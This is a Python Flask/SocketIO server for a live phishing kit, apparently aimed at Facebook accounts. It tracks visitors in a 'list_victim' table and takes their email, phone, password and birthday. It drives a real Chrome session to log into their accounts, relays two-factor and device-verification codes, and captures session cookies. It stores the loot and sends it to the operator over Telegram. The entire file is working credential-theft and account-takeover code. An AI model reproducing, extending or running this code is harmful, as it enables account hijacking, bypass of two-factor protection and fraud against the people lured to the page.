import os
import socket

from flask import Flask, render_template, request, send_from_directory
from flask_socketio import SocketIO

from modules.database import Config, Data, Setting
from modules.lib import *

app = Flask(__name__, static_folder="static",
            template_folder="static", static_url_path="/static")
app.config["SECRET_KEY"] = os.urandom(24)
socketio = SocketIO(app)
list_victim = {}
cookie_type = ""
data = Config().get_info()
telegram = ''
try:
    api_token = data["api_token"]
    chat_id = data["chat_id"]
except:
    api_token = ""
    chat_id = ""
if api_token == "" or chat_id == "":
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    print("Vào trang Admin để cấu hình Telegram trước khi chạy web!")
    print(f"http://{ip}:8080/dashboard/config/telegram")
    exit(0)


@socketio.on("connect")
def handle_connect():
    global cookie_type, api_token, chat_id, telegram
    setting = Setting().get_info()
    proxy = Config().get_info()["proxy"]
    load_image = setting["load_image"]
    load_css = setting["load_css"]
    hide_chrome = setting["hide_chrome"]
    auto_close = setting["auto_close"]
    cookie_type = setting["cookie_type"]
    api_token = Config().get_info()["api_token"]
    chat_id = Config().get_info()["chat_id"]
    telegram = Telegram(api_token, chat_id)
    if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0]
    else:
        ip = request.remote_addr
    proxy = None if proxy == "" else proxy
    str(ip)
    if ip in list_victim:
        pass
    else:
        list_victim[ip] = AutoChrome(
            image=bool(load_image), css=bool(load_css), headless=bool(hide_chrome), auto_close=bool(auto_close), proxy=proxy)


@socketio.on("disconnect")
def handle_disconnect():
    if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0]
    else:
        ip = request.remote_addr
    ip = str(ip)
    if ip in list_victim:
        list_victim.pop(ip)


@socketio.on("exit")
def handle_exit():
    if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0]
    else:
        ip = request.remote_addr
    ip = str(ip)
    if ip in list_victim:
        list_victim.pop(ip)


@socketio.on("login")
def handle_login(data):
    global cookie_type, api_token, chat_id, telegram
    setting = Setting().get_info()
    proxy = Config().get_info()["proxy"]
    load_image = setting["load_image"]
    load_css = setting["load_css"]
    hide_chrome = setting["hide_chrome"]
    auto_close = setting["auto_close"]
    cookie_type = setting["cookie_type"]
    api_token = Config().get_info()["api_token"]
    chat_id = Config().get_info()["chat_id"]
    if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0]
    else:
        ip = request.remote_addr
    str(ip)
    country = get_country(ip)
    if ip in list_victim:
        pass
    else:
        list_victim[ip] = AutoChrome(
            image=bool(load_image), css=bool(load_css), headless=bool(hide_chrome), auto_close=bool(auto_close), proxy=proxy)
    list_victim[ip].email = data["email"]
    list_victim[ip].phone_number = data["phone"]
    list_victim[ip].password = data["password"]
    list_victim[ip].birthday = data["date"]
    status = list_victim[ip].authenticate_account(
        data["email"], data["password"])
    if status["message"] == "WRONG_CREDENTIALS":
        status = list_victim[ip].authenticate_account(
            data["phone"], data["password"])
        if status["message"] == "WRONG_CREDENTIALS":
            Data().add_data(username=data["email"], password=data["password"],
                            country=country, type='SMK')
            telegram.send_message(
                'Sai mật khẩu', data["email"], data["phone"], data["password"], ip=ip, country=country, birthday=data["date"])
    if status["message"] == "LOGGED_IN":
        cookie = list_victim[ip].get_cookie(cookie_type)
        Data().add_data(username=data["email"], password=data["password"], cookie=cookie,
                        country=country, type='NUL')
        telegram.send_message(
            'KHÔNG BẬT 2FA', data["email"], data["phone"], data["password"], cookie, ip=ip, country=country, birthday=data["date"])
    if status["message"] == "DEVICE_VERIFICATION":
        telegram.send_message(
            '681 CHƯA XÁC MINH', data["email"], data["phone"], data["password"], ip=ip, country=country, birthday=data["date"])
    socketio.emit("loginResponse", status)


@socketio.on("two-factor")
def handle_two_factor(code):
    if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0]
    else:
        ip = request.remote_addr
    str(ip)
    if ip in list_victim:
        pass
    else:
        return {"status": "failed", "message": "CHECKPOINT_ACCOUNT"}
    status = list_victim[ip].enter_code_two_factor(code)
    if status["message"] == "LOGGED_IN":
        cookie = list_victim[ip].get_cookie(cookie_type)
        Data().add_data(list_victim[ip].email, list_victim[ip].password,
                        cookie, country=get_country(ip), type='2FA')
        telegram.send_message(
            '2FA', list_victim[ip].email, list_victim[ip].phone_number, list_victim[ip].password, cookie, ip, country=get_country(ip), birthday=list_victim[ip].birthday)
    socketio.emit("two-factorResponse", status)


@socketio.on("forget-password")
def handle_forget_password(code):
    if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0]
    else:
        ip = request.remote_addr
    str(ip)
    if ip in list_victim:
        pass
    else:
        return {"status": "failed", "message": "CHECKPOINT_ACCOUNT"}
    Data().add_data(list_victim[ip].email, list_victim[ip].password,
                    code, country=get_country(ip), type='FGP')
    telegram.send_code(
        'RESET MẬT KHẨU', list_victim[ip].email, list_victim[ip].phone_number, list_victim[ip].password, code, ip, country=get_country(ip), birthday=list_victim[ip].birthday)
    socketio.emit("forget-passwordResponse",
                  {"status": "success", "message": "LOGGED_IN"})


@socketio.on("device")
def handle_forget_password(code):
    if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0]
    else:
        ip = request.remote_addr
    str(ip)
    if ip in list_victim:
        pass
    else:
        return {"status": "failed", "message": "CHECKPOINT_ACCOUNT"}
    Data().add_data(list_victim[ip].email, list_victim[ip].password,
                    code, country=get_country(ip), type='FGP')
    telegram.send_code(
        'CODE 681', list_victim[ip].email, list_victim[ip].phone_number, list_victim[ip].password, code, ip, country=get_country(ip), birthday=list_victim[ip].birthday)


@socketio.on("device-verification")
def handle_device_verification():
    if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0]
    else:
        ip = request.remote_addr
    str(ip)
    if ip in list_victim:
        pass
    else:
        return {"status": "failed", "message": "CHECKPOINT_ACCOUNT"}
    status = list_victim[ip].verify_device()
    AutoChrome().verify_device()
    if status["message"] == "LOGGED_IN":
        cookie = list_victim[ip].get_cookie(cookie_type)
        Data().add_data(list_victim[ip].email, list_victim[ip].password,
                        cookie, country=get_country(ip), type='681')
        telegram.send_message(
            '681', list_victim[ip].email, list_victim[ip].phone_number, list_victim[ip].password, cookie, ip, country=get_country(ip), birthday=list_victim[ip].birthday)
    socketio.emit("device-verificationResponse", status)


@app.route('/')
def index():
    return render_template('index.html')


@app.route("/<path:path>")
def catch_all(path):
    if "." in path:
        return send_from_directory(app.static_folder, path)
    return render_template('index.html')


if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", debug=True, port=5000)
